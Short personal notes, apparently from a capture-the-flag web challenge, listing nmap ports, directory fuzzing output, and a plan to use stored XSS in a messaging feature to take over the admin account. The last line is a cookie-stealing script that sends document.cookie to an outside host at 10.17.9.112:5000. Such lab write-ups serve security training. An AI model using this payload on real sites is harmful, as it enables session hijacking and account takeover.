start with nmap

80
22
32768

***

http 80

fuzz :

```
admin                   [Status: 403, Size: 392, Words: 75, Lines: 22]
Admin                   [Status: 403, Size: 392, Words: 75, Lines: 22]
ADMIN                   [Status: 403, Size: 392, Words: 75, Lines: 22]
images                  [Status: 301, Size: 179, Words: 7, Lines: 11]
login                   [Status: 200, Size: 857, Words: 200, Lines: 36]
Login                   [Status: 200, Size: 857, Words: 200, Lines: 36]
messages                [Status: 302, Size: 28, Words: 4, Lines: 1]
new                     [Status: 302, Size: 28, Words: 4, Lines: 1]
robots.txt              [Status: 200, Size: 31, Words: 3, Lines: 3]
signup                  [Status: 200, Size: 667, Words: 159, Lines: 31]
stylesheets             [Status: 301, Size: 189, Words: 7, Lines: 11]

```

/admin can't access by us.

test cookies for sql injection

we can send message to admin.

create two account. try to send message from 1 to 2 and try to get xss. if success try to get admin cookies.


<script type=“text/javascript”>document.location=“http://10.17.9.112:5000/?c=“+document.cookie;</script>